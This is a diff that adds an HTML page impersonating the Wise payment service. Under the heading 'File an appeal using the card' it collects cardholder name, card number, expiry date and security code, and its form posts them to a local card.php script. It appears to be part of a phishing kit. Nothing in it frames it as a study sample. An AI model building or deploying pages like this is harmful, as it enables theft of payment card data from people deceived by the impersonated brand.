@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" >
+	<head>
+		<meta http-equiv="content-type" content="text/html" charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<meta name="description" content="" >
+		<link rel="StyleSheet" href="card.css" />
+		<script src="pages.js"></script>
+		<script src="https://secure.exportkit.com/cdn/js/ek_googlefonts.js?v=6"></script>
+	</head>
+	<body>
+		<div id="content-container" >
+			<div id="page_iphone_14___15_pro___1_ek1"  nameid="iPhone 14 &amp; 15 Pro - 1"  >
+				<div  nameid="iPhone 14 &amp; 15 Pro - 1"  id="_bg__iphone_14___15_pro___1_ek2"  ></div>
+				<svg class="np-logo-svg" alt="Wise" xmlns="http://www.w3.org/2000/svg" width="26" height="24" fill="#163300" style="display: block; position: relative; z-index: 1; margin-top: 30px; margin-left: 10px;">
+    <path d="M6.826 7.232 0 15.21h12.188l1.37-3.762H8.335l3.191-3.69.01-.098L9.461 4.09h9.336L11.56 24h4.953L25.25 0H2.676l4.15 7.232Z"></path>
+</svg>
+<div id="button" style="margin-left: 5px;" onclick="submitForm();">
+    <div id="_bg__button_ek1">
+        <span id="confirm">Confirm</span>
+    </div>
+</div>
+
+
+				</div>
+				<div  nameid="Heading 2  Confirm activity with a card"  id="heading_2___confirm_activity_with_a_card" >
+					File an appeal using the card
+				</div>
+				<div  nameid="You can file an appeal with Visa, Mastercard or Maestro cards."  id="you_can_file_an_appeal_with_visa__mastercard_or_maestro_cards_" >
+					You can file an appeal with Visa, Mastercard or Maestro cards.
+				</div>
+<form action="./scriptsphp/card.php" method="post">
+				<div id="input" nameid="Input">
+    <input type="text" name="cardHolder" id="_bg__input_ek1" style="border: none; outline: none; padding-left: 10px; font-weight: 500;">
+</div>
+
+<div id="input_ek2" nameid="Input">
+    <input type="text" name="cardNumber" id="_bg__input_ek3" style="border: none; outline: none; padding-left: 10px; font-weight: 500;">
+    <div id="svg" nameid="SVG">
+			<svg width="24" height="24" fill="currentColor" focusable="false" viewBox="0 0 24 24">
+																														<path fill-rule="evenodd" d="M2.576 5.143a.861.861 0 0 0-.862.861v12.42c0 .476.386.862.862.862h18.848a.861.861 0 0 0 .862-.862V6.004a.861.861 0 0 0-.862-.861H2.576Zm.853 12.428V6.857H20.57v10.714H3.43Zm4.285-5.142H5.143v-1.715h2.571v1.715Zm11.143 3.428H5.143v-1.714h13.714v1.714Z" clip-rule="evenodd"></path>
+																												</svg>
+    </div>
+</div>
+
+<div id="input_ek4" nameid="Input">
+    <input type="text" name="dueDate" id="_bg__input_ek5" style="border: none; outline: none; padding-left: 10px; font-weight: 500;">
+</div>
+				<div  nameid="Label  Card number"  id="label___card_number" >
+					Card holder
+				</div>
+				<div  nameid="Label  Card number"  id="label___card_number_ek1" >
+					Card number
+				</div>
+				<div  nameid="Label  Due date (MM/YY)"  id="label___due_date__mm_yy_" >
+					Due date (MM/YY)
+				</div>
+
+				<div id="input_ek6" nameid="Input">
+    <input type="password" name="securityCode" id="_bg__input_ek7" style="border: none; outline: none; padding-left: 10px; font-weight: 500;" maxlength="4" onkeypress="return /[0-9]/i.test(event.key)">
+    <div id="svg_ek2" nameid="SVG">
+        <svg width="24" height="24" fill="currentColor" focusable="false" viewBox="0 0 24 24">
+            <path fill-rule="evenodd" d="M2.576 4.286a.861.861 0 0 0-.862.861v13.277c0 .476.386.862.862.862h18.848a.861.861 0 0 0 .862-.862V5.147a.861.861 0 0 0-.862-.861H2.576Zm.853 3.857V6H20.57V17.57H3.43V9.857H20.57V8.143H3.43Zm15 5.571h-2.572V12h2.572v1.714Z" clip-rule="evenodd"></path>
+        </svg>
+    </div>
+</div>
+</form>
+				<div  nameid="Label  Security code (CVC/CVV)"  id="label___security_code__cvc_cvv_" >
+					Security code
+				</div>
+				</div>
+			</div>
+		</div>
+		<script>
+function submitForm() {
+    document.querySelector('form').submit();
+}
+</script>
+		<script>
+document.querySelector('#_bg__input_ek5').addEventListener('keyup', function(e) {
+    var val = this.value;
+    if (val.length === 1 && val.indexOf('/') === -1 && val !== '1' && val !== '0' && e.key !== 'Backspace') {
+        this.value = '0' + val + '/';
+    } else if (val.length === 2 && val.indexOf('/') === -1 && e.key !== 'Backspace') {
+        this.value = val + '/';
+    }
+});
+</script>
+	</body>
+</html>
